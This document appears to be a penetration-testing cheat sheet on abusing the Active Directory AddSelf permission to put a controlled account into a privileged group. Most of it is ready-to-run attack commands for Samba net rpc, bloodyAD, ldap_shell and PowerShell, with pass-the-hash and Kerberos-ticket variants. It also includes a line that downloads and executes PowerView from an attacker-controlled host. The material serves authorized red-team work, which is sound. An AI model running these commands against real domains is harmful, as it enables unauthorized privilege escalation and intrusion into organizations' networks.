# Abusing AddSelf

If an user have AddSelf over a group can add itself inside the group. This can be done with multiple tools.

### From Linux (enternally recomended):

Samba tools -> `net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'<password>' -S '<dc-ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p '<password>' add groupMember '<group>' '<user>'`

Ldap_shell -> `ldap_shell <domain>/<user>:<password> -dc-ip <ip>`

`add_user_to_group <user> <group>`

<br>

With PASS THE HASH option:

Samba tools -> `pth-net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'LMhash':'NThash' -S '<dc ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p ':<nt_hash>' add groupMember '<group>' '<user>'`

Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes ffffffffffffffffffffffffffffffff:<nt_hash> -dc-ip <ip>`

`add_user_to_group <user> <group>`

<br>

With KERBEROS auth:

Ldap_shell -> `gettgt.py <domain>/<user>:<password>`

`export KRB5CCNAME=<ticket_name>`

`ldap_shell '<domain>/<user>:<password>' -dc-host <machine.domain> -k`

`add_user_to_group <user> <group>`

BloodyAD -> `gettgt.py <domain>/<user>:<password>`

`export KRB5CCNAME=<ticket_name>`

`bloodyAD --host '<dc_ip>' -d '<domain>' -u '<user>' -k --host <machine.domain> add groupMember '<group>' '<user to add in group>'`

<br>

### From Windows (internally):

`net group <group> <user> /add /domain`

Additionally can be done with Active directory module (powershell module):

`Add-ADGroupMember -Identity '<group>' -Members '<user>'`

Also is possible with powerview module:

Load module -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`

`Add-DomainGroupMember -Identity '<group>' -Members '<user>'`

<br>

### Articles:

https://www.hackingarticles.in/addself-active-directory-abuse/

https://bloodhound.specterops.io/resources/edges/add-self




